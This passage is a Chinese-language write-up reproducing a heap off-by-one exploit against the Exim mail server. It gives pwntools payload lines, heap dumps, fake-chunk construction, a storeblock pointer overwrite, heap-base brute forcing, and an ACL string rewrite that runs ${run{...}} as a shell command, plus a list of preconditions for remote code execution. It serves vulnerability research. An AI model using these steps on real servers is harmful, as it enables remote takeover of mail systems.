根据第三步叙述的，我们来触发`off by one`漏洞
    payload1 = "HfHf"*0xaae
    p.sendline("AUTH CRAM-MD5")
    p.sendline(payload1[:-1])
    # heap
    0x1d15180 PREV_INUSE {
      prev_size = 0x0,
      size = 0x2021,
      fd = 0x1d191b0,
      bk = 0x2008,
      fd_nextsize = 0xf11ddff11ddff11d,
      bk_nextsize = 0x1ddff11ddff11ddf
    }
    0x1d171a0 PREV_INUSE {
      prev_size = 0x1ddff11ddff11ddf,
      size = 0x20f1,
      fd = 0x6363636363636363,
      bk = 0x6363636363636363,
      fd_nextsize = 0x6363636363636363,
      bk_nextsize = 0x6363636363636363
    }
    0x1d19290 PREV_INUSE IS_MMAPED {
      prev_size = 0x6363636363636363,
      size = 0x6363636363636363,
      fd = 0x6363636363636363,
      bk = 0x6363636363636363,
      fd_nextsize = 0x6363636363636363,
      bk_nextsize = 0x6363636363636363
    }
并且构造在第三块chunk中构造一个fake chunk
    payload = p64(0x20f0)+p64(0x1f31)
    p.sendline("AUTH CRAM-MD5")
    p.sendline((payload*484).encode("base64").replace("\n",""))
    # heap
    0x1d15180 PREV_INUSE {
      prev_size = 0x0,
      size = 0x2021,
      fd = 0x1d191b0,
      bk = 0x2008,
      fd_nextsize = 0xf11ddff11ddff11d,
      bk_nextsize = 0x1ddff11ddff11ddf
    }
    0x1d171a0 PREV_INUSE {
      prev_size = 0x1ddff11ddff11ddf,
      size = 0x20f1,
      fd = 0x6363636363636363,
      bk = 0x6363636363636363,
      fd_nextsize = 0x6363636363636363,
      bk_nextsize = 0x6363636363636363
    }
    0x1d19290 PREV_INUSE {
      prev_size = 0xf0,
      size = 0x1f31,
      fd = 0x20f0,
      bk = 0x1f31,
      fd_nextsize = 0x20f0,
      bk_nextsize = 0x1f31
    }
    0x1d1b1c0 PREV_INUSE {
      prev_size = 0x2020,
      size = 0x4041,
      fd = 0x7f9520918288,
      bk = 0x7f9520918288,
      fd_nextsize = 0x1d1b1c0,
      bk_nextsize = 0x1d1b1c0
    }
##### STEP 5
下一步跟meh一样，通过释放`sender_host_name`，把一个原本0x2000的chunk扩展成0x20f0,
但是却不触发`smtp_reset`
    p.sendline("EHLO a+")
    # heap
    0x1d171a0 PREV_INUSE {
      prev_size = 0x1ddff11ddff11ddf,
      size = 0x20f1,
      fd = 0x1d21240,
      bk = 0x7f9520917b78,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x1d19290 {
      prev_size = 0x20f0,
      size = 0x1f30,
      fd = 0x20f0,
      bk = 0x1f31,
      fd_nextsize = 0x20f0,
      bk_nextsize = 0x1f31
    }
##### STEP 6
meh提供了一种不需要泄露地址就能RCE的思路
exim有一个`expand_string`函数，当其处理的参数中有`${run{xxxxx}}`, `xxxx`则会被当成shell命令执行
而`acl_check`函数中会对各个命令的配置进行检查，然后把配置信息的字符串调用`expand_string`函数
我复现环境的配置信息如下:
    pwndbg> x/18gx &acl_smtp_vrfy
    0x6ed848 :   0x0000000000000000  0x0000000000000000
    0x6ed858 :   0x0000000001cedac0  0x0000000000000000
    0x6ed868 :    0x0000000000000000  0x0000000000000000
    0x6ed878 :   0x0000000000000000  0x0000000000000000
    0x6ed888 :   0x0000000000000000  0x0000000000000000
    0x6ed898 :   0x0000000000000000  0x0000000000000000
    0x6ed8a8 :   0x0000000001cedad0  0x0000000000000000
    0x6ed8b8 :   0x0000000001cedae0  0x0000000000000000
所以我有`rcpt`, `data`, `auth`这三个命令可以利用
比如`0x0000000001cedae0`地址当前的内容是:
    pwndbg> x/s 0x0000000001cedae0
    0x1cedae0:  "acl_check_auth"
当我把该字符串修改为`${run{/usr/bin/touch /tmp/pwned}}`
则当我向服务器发送`AUTH`命令时，exim将会执行`/usr/bin/touch /tmp/pwned`
所以之后就是meh所说的利用链:
修改`storeblock`的next指针为储存`acl_check_xxxx`字符串的堆块地址 -> 调用smtp_reset ->
储存`acl_check_xxxx`字符串的堆块被释放丢入unsortedbin ->
申请堆块，当堆块的地址为储存`acl_check_xxxx`字符串的堆块时，我们可以覆盖该字符串为命令执行的字符串 -> RCE
##### STEP 7
根据上一步所说，我们首先需要修改next指针，第二块chunk的原始大小是0x2000，被修改后新的大小是0x20f0，下一个`storeblock`的地址为第二块chunk+0x2000，next指针地址为第二块chunk+0x2010
所以我们申请一个0x2020的chunk，就能够覆盖next指针：
    p.sendline("AUTH CRAM-MD5")
    p.sendline(base64.b64encode(payload*501+p64(0x2021)+p64(0x2021)+p32(address)))
这里有一个问题
第二个chunk在`AUTH CRAM-MD5`命令执行时就被分配了，所以`b64decode`的内存是从`next_yield`获取的
这样就导致一个问题，我们能通过之前的构造来控制在执行`b64decode`时`yield_length`的大小，最开始我的一个思路就是，仍然利用`off
by one`漏洞来修改next，这也是我理解的meh所说的`partial write`
但是实际情况让我这个思路失败了
    pwndbg> x/16gx 0x1d171a0+0x2000
    0x1d191a0:  0x0063636363636363  0x0000000000002021
    0x1d191b0:  0x0000000001d171b0  0x0000000000002000
当前的next指针的值为0x1d171b0，如果利用我的思路是可以修改1-2字节，然而储存`acl_check_xxx`字符的堆块地址为0x1ced980
我们需要修改3字节，所以这个思路行不通
所以又有了另一个思路，因为exim是通过fork起子进程来处理每个socket连接的，所以我们可以爆破堆的基地址，只需要爆破2byte
##### STEP 8
在解决地址的问题后，就是对堆进行填充，然后修改相关`acl_check_xxx`指向的字符串
然后附上利用截图：
#### 总结
坑踩的挺多，尤其是在纠结meh所说的`partial
write`，之后在github上看到别人公布的exp，同样也是使用爆破的方法，所以可能我对`partial write`的理解有问题吧
另外，通过与github上的exp进行对比，发现不同版本的exim，`acl_check_xxx`的堆偏移也有差别，所以如果需要RCE
exim，需要满足下面的条件：
  1. 包含漏洞的版本(小于等于commit 38e3d2dff7982736f1e6833e06d4aab4652f337a的版本)
  2. 开启CRAM-MD5认证，或者其他有调用b64decode函数的认证
  3. 需要有该exim的binary来计算堆偏移
  4. 需要知道exim的启动参数
#### 参考
  1. 
  2. 
  3. 
* * *